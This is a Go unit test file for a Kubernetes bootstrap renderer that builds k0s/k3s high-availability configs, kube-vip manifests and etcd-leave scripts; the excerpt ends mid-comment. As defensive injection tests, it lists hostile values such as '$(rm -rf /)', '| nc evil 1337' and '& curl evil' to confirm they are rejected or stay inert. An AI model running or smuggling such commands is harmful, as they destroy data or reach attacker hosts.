/*
Copyright 2024 The Kairos CAPI Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
implied. See the License for the specific language governing
permissions and limitations under the License.
*/

package bootstrap

import (
	"io"
	"os"
	"os/exec"
	"strings"
	"testing"

	yaml "gopkg.in/yaml.v3"
)

// haCPData builds a control-plane TemplateData for the given role/distro/infra
// with a representative HA topology: a stable ControlPlaneEndpointHost (CAPV) or
// LB endpoint (CAPK), a VIP block (CAPV only), and a join token for join nodes.
func haCPData(role string, kubevirt bool) TemplateData {
	d := TemplateData{
		Role:             "control-plane",
		ControlPlaneRole: role,
		Hostname:         "kairos-cp-0",
		UserName:         "kairos",
		UserGroups:       []string{"admin"},
		IsKubeVirt:       kubevirt,
	}
	if role == "join" {
		d.JoinToken = "K10deadbeef::server:cafef00d"
	}
	if kubevirt {
		d.ControlPlaneLBEndpoint = "10.96.0.10"
		d.ManagementEndpoint = &ManagementEndpoint{
			APIServer:                 "https://mgmt.example.com:6443",
			Token:                     "mgmt-token",
			KubeconfigSecretName:      "cluster-kubeconfig",
			KubeconfigSecretNamespace: "default",
			ClusterName:               "ha-cluster",
		}
	} else {
		d.VIP = &VIPConfig{Address: "192.168.1.240", Interface: "eth0", Mode: "ARP"}
		d.ManagementEndpoint = &ManagementEndpoint{
			APIServer:                 "https://mgmt.example.com:6443",
			Token:                     "mgmt-token",
			KubeconfigSecretName:      "cluster-kubeconfig",
			KubeconfigSecretNamespace: "default",
			ClusterName:               "ha-cluster",
			ControlPlaneEndpointHost:  "192.168.1.240",
		}
	}
	return d
}

// TestHA_CapkK0sControlPlaneEnablesWorker guards the Phase-4 CAPK-HA lab finding
// (2026-07-02): an HA k0s control-plane node on CAPK MUST render --enable-worker.
// A controller-only k0s node registers no kubelet/Kubernetes Node, so CAPI never
// populates Machine.status.nodeRef, and the join gate (init must be joinable) plus
// the etcd-health reporter/kubeconfig-push all key off that NodeRef — without the
// flag, an HA CAPK k0s cluster never forms. Single-node is schedulable via --single
// and must NOT carry --enable-worker. k3s servers are schedulable by default (no
// --disable-agent), so this is a k0s-only concern.
func TestHA_CapkK0sControlPlaneEnablesWorker(t *testing.T) {
	for _, role := range []string{"init", "join"} {
		out, err := RenderK0sCloudConfig(haCPData(role, true))
		if err != nil {
			t.Fatalf("render k0s CAPK %s: %v", role, err)
		}
		if !strings.Contains(string(out), "--enable-worker") {
			t.Errorf("CAPK k0s HA %s node must render --enable-worker so it registers a Node "+
				"(NodeRef); without it the join gate never opens", role)
		}
	}

	// Single-node uses --single (already schedulable) and must not add --enable-worker.
	single := TemplateData{
		Role:             "control-plane",
		ControlPlaneRole: "single",
		SingleNode:       true,
		Hostname:         "kairos-cp-0",
		UserName:         "kairos",
		UserGroups:       []string{"admin"},
		IsKubeVirt:       true,
	}
	out, err := RenderK0sCloudConfig(single)
	if err != nil {
		t.Fatalf("render k0s CAPK single: %v", err)
	}
	if strings.Contains(string(out), "--enable-worker") {
		t.Error("CAPK k0s single-node must not render --enable-worker (schedulable via --single)")
	}
}

// TestHA_WorkerIgnoresControlPlaneRole is the render-time half of CPR-INV-1: a
// worker config carrying controlPlaneRole=init/join must NOT produce any
// control-plane HA artifact (no --cluster-init, no controller-token, no
// kube-vip). The helpers gate every HA branch on Role=="control-plane", so a
// poisoned worker config renders a plain worker. (The controller-side
// enforcement is Phase 3's CPR-INV-1; this proves the renderer does not betray
// it even if a poisoned config reaches render.)
func TestHA_WorkerIgnoresControlPlaneRole(t *testing.T) {
	for _, role := range []string{"init", "join"} {
		for _, dist := range []string{"k0s", "k3s"} {
			t.Run(role+"/"+dist, func(t *testing.T) {
				d := TemplateData{
					Role:             "worker",
					ControlPlaneRole: role, // hostile: a worker must never honor this
					UserName:         "kairos",
					WorkerToken:      "wt",
					K3sToken:         "k3t",
					K3sServerURL:     "https://server:6443",
					VIP:              &VIPConfig{Address: "192.168.1.240", Interface: "eth0", Mode: "ARP"},
				}
				out, err := renderForDist(dist, d)
				if err != nil {
					t.Fatalf("render: %v", err)
				}
				for _, forbidden := range []string{"--cluster-init", "controller-token", "server-token", "kube-vip.yaml"} {
					if strings.Contains(out, forbidden) {
						t.Errorf("worker with controlPlaneRole=%q must NOT render control-plane HA artifact %q", role, forbidden)
					}
				}
			})
		}
	}
}

// TestHA_InitVsSingle_K0s asserts the documented init-vs-single delta for k0s:
// init drops --single, keeps managed etcd, and emits api.sans for the endpoint.
// The "single" side uses the opt-in K0sSingleNode mode, which is the only path
// that still renders the standalone --single flag (the default single control
// plane renders --enable-worker so it can accept worker joins).
func TestHA_InitVsSingle_K0s(t *testing.T) {
	single := haCPData("single", false)
	single.SingleNode = true
	single.K0sSingleNode = true
	single.VIP = nil // single never renders kube-vip
	single.ManagementEndpoint = nil
	sOut, err := RenderK0sCloudConfig(single)
	if err != nil {
		t.Fatalf("render single: %v", err)
	}
	if !strings.Contains(sOut, "- --single") {
		t.Error("k0s single (K0sSingleNode opt-in) must contain --single")
	}

	iOut, err := RenderK0sCloudConfig(haCPData("init", false))
	if err != nil {
		t.Fatalf("render init: %v", err)
	}
	if strings.Contains(iOut, "- --single") {
		t.Error("k0s init must NOT contain --single (managed etcd, not single-node)")
	}
	if !strings.Contains(iOut, "--config /etc/k0s/k0s.yaml") {
		t.Error("k0s init must pass --config so api.sans is honored")
	}
	if !strings.Contains(iOut, "sans:") || !strings.Contains(iOut, "- 192.168.1.240") {
		t.Error("k0s init must include the control-plane endpoint in api.sans")
	}
}

// TestHA_JoinTokenFile asserts join nodes write the token file and reference it,
// across both distributions, and that the token round-trips (no shell/YAML
// mangling of an opaque token).
func TestHA_JoinTokenFile(t *testing.T) {
	cases := []struct {
		name      string
		render    func(TemplateData) (string, error)
		tokenPath string
		serverArg string
	}{
		{"k0s_capv", RenderK0sCloudConfig, "/etc/k0s/controller-token", "--token-file=/etc/k0s/controller-token"},
		{"k3s_capv", RenderK3sCloudConfig, "/etc/rancher/k3s/server-token", "--token-file=/etc/rancher/k3s/server-token"},
		{"k0s_capk", RenderK0sCloudConfig, "/etc/k0s/controller-token", "--token-file=/etc/k0s/controller-token"},
		{"k3s_capk", RenderK3sCloudConfig, "/etc/rancher/k3s/server-token", "--token-file=/etc/rancher/k3s/server-token"},
	}
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			kv := strings.HasSuffix(tc.name, "capk")
			d := haCPData("join", kv)
			out, err := tc.render(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			if !strings.Contains(out, tc.serverArg) {
				t.Errorf("join render missing token-file arg %q", tc.serverArg)
			}
			// The token must round-trip through the rendered write_files content.
			content := extractWriteFile(t, out, tc.tokenPath)
			if content == "" {
				t.Fatalf("join render missing token file %q", tc.tokenPath)
			}
			if strings.TrimSpace(content) != d.JoinToken {
				t.Errorf("join token did not round-trip in %q: got %q want %q", tc.tokenPath, strings.TrimSpace(content), d.JoinToken)
			}
		})
	}
}

// TestHA_K3sInitWritesAndUsesServerToken is the BLOCKER-1 regression guard
// (ADR 0005 Phase 3): the k3s INIT node must BOTH write the shared server-token
// file AND pass --token-file, otherwise --cluster-init auto-generates a random
// K3S_TOKEN the joiners can never match and the cluster never forms. The k0s
// init node has no such requirement (managed-etcd init mints the controller-join
// token post-init), so this guard is k3s-only.
func TestHA_K3sInitWritesAndUsesServerToken(t *testing.T) {
	const tokenPath = "/etc/rancher/k3s/server-token"
	const tokenArg = "--token-file=/etc/rancher/k3s/server-token"

	for _, kv := range []bool{false, true} { // CAPV, CAPK
		name := "capv"
		if kv {
			name = "capk"
		}
		t.Run(name, func(t *testing.T) {
			d := haCPData("init", kv)
			d.JoinToken = "K10shared::server:tokenvalue" // init must carry the shared token too
			out, err := RenderK3sCloudConfig(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			if !strings.Contains(out, "--cluster-init") {
				t.Errorf("k3s init render missing --cluster-init")
			}
			if !strings.Contains(out, tokenArg) {
				t.Errorf("k3s init render missing %q — init would auto-generate a random token (BLOCKER-1)", tokenArg)
			}
			content := extractWriteFile(t, out, tokenPath)
			if content == "" {
				t.Fatalf("k3s init render missing server-token file %q (BLOCKER-1)", tokenPath)
			}
			if strings.TrimSpace(content) != d.JoinToken {
				t.Errorf("k3s init server-token did not round-trip: got %q want %q", strings.TrimSpace(content), d.JoinToken)
			}
		})
	}
}

// TestHA_JoinTokenAdversarialRoundTrip asserts that adversarial-but-legal join
// tokens (containing YAML-significant characters but no control chars) survive
// the write_files block-scalar embed byte-for-byte, and that tokens carrying
// newline/CR/NUL are REJECTED at render time (rejectControlChars is the
// load-bearing protection for JoinToken — it is a YAML block scalar, not a shell
// context, so shquote does not apply). (internal/bootstrap/CLAUDE.md HA section.)
func TestHA_JoinTokenAdversarialRoundTrip(t *testing.T) {
	roundTrip := []string{
		`K10::server:token`,
		`a"b#c`,
		`---leading-dashes`,
		`-startsWithDash`,
		`tok:with:colons`,
		`tok with spaces`,
		`$(reboot)` + "`id`" + `${HOME}`, // shell metas: inert in a YAML block scalar
	}
	rejected := []string{
		"tok\nwith-newline",
		"tok\rwith-cr",
		"tok\x00nul",
	}

	for _, render := range []func(TemplateData) (string, error){RenderK0sCloudConfig, RenderK3sCloudConfig} {
		tokenPath := "/etc/k0s/controller-token"
		for _, tok := range roundTrip {
			d := haCPData("join", false)
			d.JoinToken = tok
			out, err := render(d)
			if err != nil {
				t.Fatalf("render with token %q: %v", tok, err)
			}
			// Determine which token file this distro wrote.
			path := tokenPath
			if strings.Contains(out, "/etc/rancher/k3s/server-token") {
				path = "/etc/rancher/k3s/server-token"
			}
			content := extractWriteFile(t, out, path)
			if strings.TrimSpace(content) != tok {
				t.Errorf("token %q did not round-trip in %q: got %q", tok, path, strings.TrimSpace(content))
			}
		}
		for _, tok := range rejected {
			d := haCPData("join", false)
			d.JoinToken = tok
			if _, err := render(d); err == nil {
				t.Errorf("token %q with control char must be rejected at render", tok)
			}
		}
	}
}

// TestHA_JoinServerURLIsEndpointNotVIP is the explicit guard for the ADR
// invariant: the k3s join --server URL is the stable ControlPlaneEndpointHost,
// NOT the VIP block (even though, in a correctly-configured cluster, the two
// values coincide). We set them to DIFFERENT values to prove which one the
// template reads.
func TestHA_JoinServerURLIsEndpointNotVIP(t *testing.T) {
	d := haCPData("join", false)
	d.ManagementEndpoint.ControlPlaneEndpointHost = "cp.example.com" // the endpoint
	d.VIP.Address = "10.10.10.10"                                    // a DIFFERENT VIP address
	out, err := RenderK3sCloudConfig(d)
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	if !strings.Contains(out, "--server=https://cp.example.com:6443") {
		t.Error("k3s join --server must use ControlPlaneEndpointHost (cp.example.com)")
	}
	if strings.Contains(out, "--server=https://10.10.10.10:6443") {
		t.Error("k3s join --server must NOT use the VIP address (10.10.10.10) — VIP only drives the kube-vip manifest")
	}
}

// TestHA_KubeVIP_OnlyCAPV asserts kube-vip renders for CAPV init/join and never
// for CAPK (OQ-5) or single-node.
func TestHA_KubeVIP_OnlyCAPV(t *testing.T) {
	type want struct {
		render   func(TemplateData) (string, error)
		role     string
		kubevirt bool
		expect   bool
	}
	cases := map[string]want{
		"k0s_capv_init": {RenderK0sCloudConfig, "init", false, true},
		"k3s_capv_join": {RenderK3sCloudConfig, "join", false, true},
		"k0s_capk_init": {RenderK0sCloudConfig, "init", true, false}, // OQ-5
		"k3s_capk_join": {RenderK3sCloudConfig, "join", true, false}, // OQ-5
		"k0s_capv_single": func() want {
			return want{RenderK0sCloudConfig, "single", false, false}
		}(),
	}
	for name, c := range cases {
		c := c
		t.Run(name, func(t *testing.T) {
			d := haCPData(c.role, c.kubevirt)
			if c.role == "single" {
				d.SingleNode = true
			}
			out, err := c.render(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			manifest := extractWriteFile(t, out, "kube-vip.yaml")
			has := manifest != ""
			if has != c.expect {
				t.Errorf("kube-vip manifest present=%v, want %v", has, c.expect)
			}
			if c.expect {
				// VIP-INV-2 + ADR 0005 § D.1: the manifest must be a valid
				// multi-document set — ServiceAccount + ClusterRole +
				// ClusterRoleBinding + DaemonSet (not a single bare Pod).
				docs := decodeKubeVIPDocs(t, manifest)
				for _, wantKind := range []string{"ServiceAccount", "ClusterRole", "ClusterRoleBinding", "DaemonSet"} {
					if _, ok := docs[wantKind]; !ok {
						t.Errorf("kube-vip manifest missing %s document", wantKind)
					}
				}
				if _, ok := docs["Pod"]; ok {
					t.Errorf("kube-vip manifest still renders a bare Pod; expected a DaemonSet (ADR 0005 § D.1)")
				}
				// The ClusterRole must grant the load-bearing leader-election
				// lease verbs — the exact grant whose absence stalled the VIP in
				// the Phase-4 lab.
				var cr struct {
					Rules []struct {
						APIGroups []string `yaml:"apiGroups"`
						Resources []string `yaml:"resources"`
						Verbs     []string `yaml:"verbs"`
					} `yaml:"rules"`
				}
				remarshalInto(t, docs["ClusterRole"], &cr)
				leaseRule := false
				for _, r := range cr.Rules {
					if strSliceHas(r.APIGroups, "coordination.k8s.io") && strSliceHas(r.Resources, "leases") &&
						strSliceHas(r.Verbs, "get") && strSliceHas(r.Verbs, "create") {
						leaseRule = true
					}
				}
				if !leaseRule {
					t.Error("kube-vip ClusterRole missing the coordination.k8s.io/leases get+create rule (leader election)")
				}
				// The DaemonSet must run as the kube-vip SA, select control-plane
				// Nodes, and tolerate the control-plane NoSchedule taint.
				var ds struct {
					Spec struct {
						Template struct {
							Spec struct {
								ServiceAccountName string            `yaml:"serviceAccountName"`
								NodeSelector       map[string]string `yaml:"nodeSelector"`
								Tolerations        []struct {
									Key    string `yaml:"key"`
									Effect string `yaml:"effect"`
								} `yaml:"tolerations"`
							} `yaml:"spec"`
						} `yaml:"template"`
					} `yaml:"spec"`
				}
				remarshalInto(t, docs["DaemonSet"], &ds)
				ps := ds.Spec.Template.Spec
				if ps.ServiceAccountName != "kube-vip" {
					t.Errorf("DaemonSet serviceAccountName=%q, want kube-vip", ps.ServiceAccountName)
				}
				if ps.NodeSelector["node-role.kubernetes.io/control-plane"] != "true" {
					t.Errorf("DaemonSet nodeSelector missing node-role.kubernetes.io/control-plane=true; got %v", ps.NodeSelector)
				}
				cpTolerated := false
				for _, tol := range ps.Tolerations {
					if tol.Key == "node-role.kubernetes.io/control-plane" && tol.Effect == "NoSchedule" {
						cpTolerated = true
					}
				}
				if !cpTolerated {
					t.Error("DaemonSet missing toleration for node-role.kubernetes.io/control-plane:NoSchedule")
				}
			}
		})
	}
}

// TestHA_KubeVIP_Mode asserts ARP vs BGP toggles the env booleans.
func TestHA_KubeVIP_Mode(t *testing.T) {
	for _, tc := range []struct {
		mode string
		arp  string
		bgp  string
	}{
		{"ARP", "true", "false"},
		{"BGP", "false", "true"},
		{"", "true", "false"}, // empty defaults to ARP
	} {
		tc := tc
		t.Run("mode="+tc.mode, func(t *testing.T) {
			d := haCPData("init", false)
			d.VIP.Mode = tc.mode
			out, err := RenderK0sCloudConfig(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			manifest := extractWriteFile(t, out, "kube-vip.yaml")
			env := kubeVIPEnv(t, manifest)
			if env["vip_arp"] != tc.arp {
				t.Errorf("vip_arp=%q want %q for mode %q", env["vip_arp"], tc.arp, tc.mode)
			}
			if env["bgp_enable"] != tc.bgp {
				t.Errorf("bgp_enable=%q want %q for mode %q", env["bgp_enable"], tc.bgp, tc.mode)
			}
		})
	}
}

// kubeVIPEnv parses the kube-vip DaemonSet document out of the multi-document
// manifest (ADR 0005 § D.1) and returns its container env as a name->value map.
func kubeVIPEnv(t *testing.T, manifest string) map[string]string {
	t.Helper()
	dec := yaml.NewDecoder(strings.NewReader(manifest))
	for {
		var doc struct {
			Kind string `yaml:"kind"`
			Spec struct {
				Template struct {
					Spec struct {
						Containers []struct {
							Env []struct {
								Name  string `yaml:"name"`
								Value string `yaml:"value"`
							} `yaml:"env"`
						} `yaml:"containers"`
					} `yaml:"spec"`
				} `yaml:"template"`
			} `yaml:"spec"`
		}
		err := dec.Decode(&doc)
		if err == io.EOF {
			break
		}
		if err != nil {
			t.Fatalf("parse kube-vip manifest document: %v", err)
		}
		if doc.Kind != "DaemonSet" {
			continue
		}
		if len(doc.Spec.Template.Spec.Containers) == 0 {
			t.Fatalf("kube-vip DaemonSet has no containers")
		}
		m := map[string]string{}
		for _, e := range doc.Spec.Template.Spec.Containers[0].Env {
			m[e.Name] = e.Value
		}
		return m
	}
	t.Fatalf("kube-vip manifest has no DaemonSet document:\n%s", manifest)
	return nil
}

// decodeKubeVIPDocs decodes every YAML document in the multi-document kube-vip
// manifest into a generic map, keyed by kind (ADR 0005 § D.1). Every document
// must be valid YAML — this is the VIP-INV-2 "the whole set parses" guard.
func decodeKubeVIPDocs(t *testing.T, manifest string) map[string]map[string]any {
	t.Helper()
	byKind := map[string]map[string]any{}
	dec := yaml.NewDecoder(strings.NewReader(manifest))
	for {
		var m map[string]any
		err := dec.Decode(&m)
		if err == io.EOF {
			break
		}
		if err != nil {
			t.Fatalf("kube-vip manifest document is not valid YAML: %v\n%s", err, manifest)
		}
		if m == nil {
			continue
		}
		kind, _ := m["kind"].(string)
		byKind[kind] = m
	}
	return byKind
}

// remarshalInto re-serializes a generic decoded document and unmarshals it into
// the typed out, so a test can make typed assertions on one document of a
// multi-document manifest.
func remarshalInto(t *testing.T, m map[string]any, out any) {
	t.Helper()
	b, err := yaml.Marshal(m)
	if err != nil {
		t.Fatalf("re-marshal document: %v", err)
	}
	if err := yaml.Unmarshal(b, out); err != nil {
		t.Fatalf("unmarshal document into %T: %v", out, err)
	}
}

// strSliceHas reports whether s contains v.
func strSliceHas(s []string, v string) bool {
	for _, e := range s {
		if e == v {
			return true
		}
	}
	return false
}

// vipInjectionPayloads are shell/YAML-injection strings an operator could try
// to smuggle through VIP.Address / VIP.Interface. Every one must be REJECTED by
// validateVIP at render time (VIP-INV-3): none is a valid IP/hostname or
// interface name, so the render fails before any byte reaches the shell or the
// marshaled manifest.
var vipInjectionPayloads = map[string]string{
	"command substitution":  "$(rm -rf /)",
	"backtick substitution": "`reboot`",
	"semicolon":             "1.2.3.4; rm -rf /",
	"pipe":                  "1.2.3.4 | nc evil 1337",
	"ampersand background":  "1.2.3.4 & curl evil",
	"double quote":          `1.2.3.4"`,
	"single quote":          "1.2.3.4'",
	"newline":               "1.2.3.4\nrm -rf /",
	"yaml doc separator":    "1.2.3.4\n---\nevil: true",
	"yaml flow mapping":     "{evil: true}",
	"dollar brace":          "${IFS}cat",
	"all-zeros (semantic)":  "", // empty rejected explicitly below; placeholder
}

// TestVIP_Injection_Rejected asserts that an injection payload in either VIP
// field is rejected by the renderer (VIP-INV-3), for both distributions. This
// is the heart of the Phase-2 security mandate: the kube-vip block runs
// privileged on every CP node, so a malformed VIP must never reach render.
func TestVIP_Injection_Rejected(t *testing.T) {
	for name, payload := range vipInjectionPayloads {
		if payload == "" {
			continue // covered by TestVIP_EmptyAddressRejected
		}
		for _, field := range []string{"address", "interface"} {
			for _, dist := range []string{"k0s", "k3s"} {
				t.Run(name+"/"+field+"/"+dist, func(t *testing.T) {
					d := haCPData("init", false)
					switch field {
					case "address":
						d.VIP.Address = payload
					case "interface":
						d.VIP.Interface = payload
					}
					if _, err := renderForDist(dist, d); err == nil {
						t.Errorf("render with injection in VIP.%s=%q: expected error, got nil", field, payload)
					}
				})
			}
		}
	}
}

// TestVIP_EmptyAddressRejected pins the empty-address rejection.
func TestVIP_EmptyAddressRejected(t *testing.T) {
	d := haCPData("init", false)
	d.VIP.Address = ""
	if _, err := RenderK0sCloudConfig(d); err == nil {
		t.Error("empty VIP.Address must be rejected at render time")
	}
}

// TestVIP_ValidShapesAccepted asserts the canonical valid VIP shapes render.
func TestVIP_ValidShapesAccepted(t *testing.T) {
	cases := []struct {
		name string
		vip  VIPConfig
	}{
		{"ipv4 ARP", VIPConfig{Address: "192.168.1.240", Interface: "eth0", Mode: "ARP"}},
		{"ipv6 BGP", VIPConfig{Address: "2001:db8::1", Interface: "ens3", Mode: "BGP"}},
		{"hostname empty-mode", VIPConfig{Address: "cp.example.com", Interface: "bond0", Mode: ""}},
		{"bonded vlan iface", VIPConfig{Address: "10.0.0.5", Interface: "bond0.100", Mode: "ARP"}},
	}
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			d := haCPData("init", false)
			d.VIP = &tc.vip
			d.ManagementEndpoint.ControlPlaneEndpointHost = "cp.example.com"
			out, err := RenderK0sCloudConfig(d)
			if err != nil {
				t.Fatalf("render with valid VIP %+v: %v", tc.vip, err)
			}
			manifest := extractWriteFile(t, out, "kube-vip.yaml")
			env := kubeVIPEnv(t, manifest)
			// VIP-INV-2 round-trip: the address/interface land in the manifest
			// env verbatim (yaml.v3 quoting envelope) — never mangled.
			if env["address"] != tc.vip.Address {
				t.Errorf("address did not round-trip: got %q want %q", env["address"], tc.vip.Address)
			}
			if env["vip_interface"] != tc.vip.Interface {
				t.Errorf("interface did not round-trip: got %q want %q", env["vip_interface"], tc.vip.Interface)
			}
		})
	}
}

// TestVIP_AdversarialInterface_BehindRegex documents that even if the
// interface-name regex were widened in future, the renderer marshals via
// yaml.v3 so a metachar can never break out of the env scalar. We cannot pass
// the regex with metachars today (they are rejected — see
// TestVIP_Injection_Rejected), so this asserts the marshaling envelope directly
// at the kubeVIPManifest level with a deliberately hostile value.
func TestVIP_ManifestMarshalEnvelopeHolds(t *testing.T) {
	hostile := []string{
		`evil: true`,
		`"; rm -rf /; echo "`,
		"$(reboot)",
		"---\nevil: true",
		"-leadingdash",
		"#hash",
		"with space",
	}
	for _, h := range hostile {
		h := h
		t.Run(h, func(t *testing.T) {
			// Call kubeVIPManifest directly (bypassing validateVIP) to prove the
			// YAML marshaling envelope (VIP-INV-2) holds regardless of the value.
			out, err := kubeVIPManifest(&VIPConfig{Address: h, Interface: h, Mode: "ARP"})
			if err != nil {
				t.Fatalf("kubeVIPManifest: %v", err)
			}
			// Every document in the multi-document set must be valid YAML — a
			// hostile value must not break out of its scalar and split/inject a
			// document. decodeKubeVIPDocs fails if any doc fails to parse.
			docs := decodeKubeVIPDocs(t, out)
			if _, ok := docs["DaemonSet"]; !ok {
				t.Fatalf("kube-vip manifest missing DaemonSet document with hostile value %q:\n%s", h, out)
			}
			env := kubeVIPEnv(t, out)
			if env["address"] != h {
				t.Errorf("hostile address did not round-trip inside YAML envelope: got %q want %q", env["address"], h)
			}
			if env["vip_interface"] != h {
				t.Errorf("hostile interface did not round-trip inside YAML envelope: got %q want %q", env["vip_interface"], h)
			}
		})
	}
}

// TestHA_RenderedScriptsValidBash runs `bash -n` on the post-bootstrap script of
// every HA render so a join/init-induced shell regression is caught at unit
// time (the script bodies only execute at node boot).
func TestHA_RenderedScriptsValidBash(t *testing.T) {
	bashPath, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash not available; skipping rendered-script syntax check")
	}
	cases := []struct {
		name   string
		render func(TemplateData) (string, error)
		role   string
		kv     bool
		script string
	}{
		{"k0s_capv_init", RenderK0sCloudConfig, "init", false, "kairos-k0s-post-bootstrap.sh"},
		{"k0s_capv_join", RenderK0sCloudConfig, "join", false, "kairos-k0s-post-bootstrap.sh"},
		{"k3s_capv_init", RenderK3sCloudConfig, "init", false, "kairos-k3s-post-bootstrap.sh"},
		{"k3s_capv_join", RenderK3sCloudConfig, "join", false, "kairos-k3s-post-bootstrap.sh"},
		{"k0s_capk_join", RenderK0sCloudConfig, "join", true, "kairos-k0s-post-bootstrap.sh"},
		{"k3s_capk_join", RenderK3sCloudConfig, "join", true, "kairos-k3s-post-bootstrap.sh"},
	}
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			d := haCPData(tc.role, tc.kv)
			// Every HA control-plane node (CAPV and CAPK, both distros) renders the
			// etcd-health reporter (ADR 0005 §E.1); set the gate so its shell body
			// is included in the bash -n syntax check.
			if d.ManagementEndpoint != nil {
				d.ManagementEndpoint.EtcdStatusSecretName = "ha-cluster-etcd-status"
			}
			out, err := tc.render(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			script := extractWriteFile(t, out, tc.script)
			if script == "" {
				t.Fatalf("post-bootstrap script %q not found", tc.script)
			}
			// The etcd-health reporter must render on every HA control-plane path
			// (CAPV and CAPK, both distros — ADR 0005 §E.1 ported to CAPK).
			if !strings.Contains(script, "push_etcd_status") {
				t.Error("etcd-health reporter (push_etcd_status) must render on every HA control-plane path")
			}
			f := filepathJoinTemp(t, strings.ReplaceAll(tc.name, "/", "_")+".sh")
			if err := os.WriteFile(f, []byte(script), 0o600); err != nil {
				t.Fatalf("write temp script: %v", err)
			}
			if outBytes, err := exec.Command(bashPath, "-n", f).CombinedOutput(); err != nil {
				t.Fatalf("bash -n on rendered %s failed: %v\n%s", tc.name, err, outBytes)
			}
		})
	}
}

// TestHA_EtcdLeaveResponder_k0sOnly asserts the ADR 0005 §E.3 etcd-leave
// responder renders on k0s HA nodes on BOTH infra backends (valid bash; gates
// on the fixed leave-requested sentinel via string equality; runs `k0s etcd
// leave` with NO externally-supplied argument), and does NOT render for k0s
// single-node or for k3s on either backend (no clean member-remove, KD-5d).
// CAPV acks via the VIP; CAPK has no VIP and acks via the stable
// ControlPlaneLBEndpoint instead (there is no VIP to front the surviving
// apiservers) — the CAPK sub-test asserts that split explicitly.
func TestHA_EtcdLeaveResponder_k0sOnly(t *testing.T) {
	bashPath, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash not available; skipping rendered-script syntax check")
	}
	assertResponder := func(t *testing.T, script string) {
		t.Helper()
		if !strings.Contains(script, `[ "${val}" = "leave-requested" ]`) {
			t.Error("leave script must gate on the fixed sentinel via string equality (security constraint #4)")
		}
		if !strings.Contains(script, "k0s etcd leave") {
			t.Error("leave script must run `k0s etcd leave`")
		}
		if strings.Contains(script, "etcd leave --peer-address") {
			t.Error("leave script must NOT pass --peer-address (node leaves itself; no external arg — security constraint #5)")
		}
		f := filepathJoinTemp(t, "k0s-etcd-leave.sh")
		if werr := os.WriteFile(f, []byte(script), 0o600); werr != nil {
			t.Fatalf("write temp script: %v", werr)
		}
		if b, berr := exec.Command(bashPath, "-n", f).CombinedOutput(); berr != nil {
			t.Fatalf("etcd-leave script is not valid bash: %v\n%s", berr, b)
		}
	}

	t.Run("capv", func(t *testing.T) {
		out, err := RenderK0sCloudConfig(haCPData("init", false))
		if err != nil {
			t.Fatalf("render k0s init: %v", err)
		}
		script := extractWriteFile(t, out, "kairos-etcd-leave.sh")
		if script == "" {
			t.Fatal("k0s CAPV HA control-plane must render the etcd-leave responder script")
		}
		assertResponder(t, script)
		if !strings.Contains(script, `srv=(--server="https://${vip_addr}:6443")`) {
			t.Error("k0s CAPV etcd-leave responder must ack via the VIP")
		}
		if strings.Contains(script, "ControlPlaneLBEndpoint") || strings.Contains(script, "lb_addr") {
			t.Error("k0s CAPV etcd-leave responder must NOT reference the CAPK LB endpoint")
		}
	})

	t.Run("capk", func(t *testing.T) {
		out, err := RenderK0sCloudConfig(haCPData("init", true))
		if err != nil {
			t.Fatalf("render k0s init: %v", err)
		}
		script := extractWriteFile(t, out, "kairos-etcd-leave.sh")
		if script == "" {
			t.Fatal("k0s CAPK HA control-plane must render the etcd-leave responder script")
		}
		assertResponder(t, script)
		// CAPK has no VIP (OQ-5): the responder must ack via the stable
		// ControlPlaneLBEndpoint, and must NOT leak any VIP/vip_addr reference.
		if !strings.Contains(script, `lb_addr='10.96.0.10'`) {
			t.Error("k0s CAPK etcd-leave responder must shquote ControlPlaneLBEndpoint into lb_addr")
		}
		if !strings.Contains(script, `srv=(--server="https://${lb_addr}:6443")`) {
			t.Error("k0s CAPK etcd-leave responder must ack via the ControlPlaneLBEndpoint (--server)")
		}
		if strings.Contains(script, "vip_addr") || strings.Contains(script, "VIP.Address") {
			t.Error("k0s CAPK etcd-leave responder must NOT reference a VIP (CAPK has no VIP, OQ-5)")
		}
	})

	// k0s single-node must NOT render it (no etcd quorum), on either backend.
	for _, kv := range []bool{false, true} {
		single := haCPData("single", kv)
		single.SingleNode = true
		sout, err := RenderK0sCloudConfig(single)
		if err != nil {
			t.Fatalf("render k0s single (kubevirt=%v): %v", kv, err)
		}
		if extractWriteFile(t, sout, "kairos-etcd-leave.sh") != "" {
			t.Errorf("k0s single-node (kubevirt=%v) must NOT render the etcd-leave responder", kv)
		}
	}

	// k3s HA must NOT render it on either backend (KD-5d: no clean member-remove).
	for _, kv := range []bool{false, true} {
		kout, err := RenderK3sCloudConfig(haCPData("init", kv))
		if err != nil {
			t.Fatalf("render k3s init (kubevirt=%v): %v", kv, err)
		}
		if extractWriteFile(t, kout, "kairos-etcd-leave.sh") != "" {
			t.Errorf("k3s (kubevirt=%v) must NOT render the etcd-leave responder (KD-5d)", kv)
		}
	}
}

// capkK0sHAWithCIDR builds the CAPK k0s HA render data for the given role with a
// representative PodCIDR/ServiceCIDR set — the cluster-wide CIDRs the controller
// stamps onto the init node's fresh ClusterConfig. It is the fixture the
// dual-interface bridge / BUG #2 regression tests below exercise.
func capkK0sHAWithCIDR(role string) TemplateData {
	d := haCPData(role, true)
	d.PodCIDR = "10.244.0.0/16"
	d.ServiceCIDR = "10.96.0.0/12"
	return d
}

// TestHA_CapkK0sJoinDropsClusterCIDRs is the BUG #2 regression guard (2026-07-02
// dual-interface bridge HA lab): a k0s JOIN node on CAPK must NOT carry the
// cluster-wide spec.network.podCIDR/serviceCIDR. Those are inherited from the
